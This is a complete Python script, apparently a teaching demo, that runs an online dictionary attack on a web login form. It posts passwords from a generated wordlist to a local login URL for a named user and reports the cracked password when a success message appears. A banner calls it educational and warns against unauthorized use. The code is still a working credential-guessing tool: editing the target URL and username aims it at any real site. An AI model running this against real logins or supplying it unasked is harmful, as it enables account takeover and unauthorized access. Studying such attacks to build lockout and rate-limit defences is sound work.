import requests  # For making HTTP requests
import time      # For simulating delays

TARGET_URL = "http://127.0.0.1:5000/"  # URL of the vulnerable web application
USERNAME_TO_ATTACK = "testuser"       # Username to target
DICTIONARY_FILE = "dictionary.txt"    # Dictionary file for passwords

def perform_online_attack(target_url, username, dictionary_file):
    """
    Performs an online dictionary attack against a login form.

    Args:
        target_url (str): URL of the login page.
        username (str): Username to attack.
        dictionary_file (str): Path to the dictionary file.

    Returns:
        str or None: The cracked password if found, otherwise None.
    """
    try:
        with open(dictionary_file, "r") as dict_file:
            for password in dict_file:
                password = password.strip()
                print(f"[*] Trying password: {password}")

                # Data to send in the POST request (form data)
                login_data = {
                    "username": username,
                    "password": password
                }

                try:
                    response = requests.post(target_url, data=login_data) # Send POST request
                    # Simulate a small delay between attempts (important for real-world scenarios - rate limiting)
                    time.sleep(0.5) # 0.5 seconds delay

                    # Check for successful login (This is VERY application-specific)
                    if "Login Successful!" in response.text: # Check for text in the response indicating success
                        print(f"\n[+] Password Cracked for username '{username}'! Password is: {password}")
                        return password
                    elif "Invalid credentials" in response.text: # Optional: Check for failure message
                        pass # Login failed, try next password
                    else:
                        print(f"[!] Unexpected response for password '{password}': Status Code: {response.status_code}, Content: {response.text[:100]}...") # Debugging for unexpected responses

                except requests.exceptions.RequestException as e:
                    print(f"[!] Request error for password '{password}': {e}")
                    continue # Move to the next password in case of network errors

        print(f"[-] Password not found in the dictionary for username '{username}'.")
        return None

    except FileNotFoundError:
        print(f"Error: Dictionary file '{dictionary_file}' not found.")
        return None


def main():
    """Main function to run the online password cracking demonstration."""
    print("--- Basic Online Password Cracking (Dictionary Attack) ---")
    print("WARNING: Use this for EDUCATIONAL PURPOSES ONLY against your LOCAL vulnerable app!")
    print("         Unauthorized online password cracking is ILLEGAL and unethical.\n")

    cracked_password = perform_online_attack(TARGET_URL, USERNAME_TO_ATTACK, DICTIONARY_FILE)

    if cracked_password:
        print(f"\n[+] Online Password Cracking Successful! Cracked Password: {cracked_password}")
    else:
        print("\n[-] Online Password Cracking Failed.")


if __name__ == "__main__":
    # Create a small example dictionary file (dictionary.txt) if it doesn't exist
    try:
        with open("dictionary.txt", "x") as f: # 'x' mode: create if not exists
            f.write("password\n")
            f.write("password123\n")
            f.write("123456\n")
            f.write("qwerty\n")
            f.write("admin\n")
            f.write("secret\n")
            f.write("test\n")
            f.write("demo123\n") # Add 'demo123' to dictionary for 'demo' user
    except FileExistsError:
        pass # Dictionary file already exists

    main()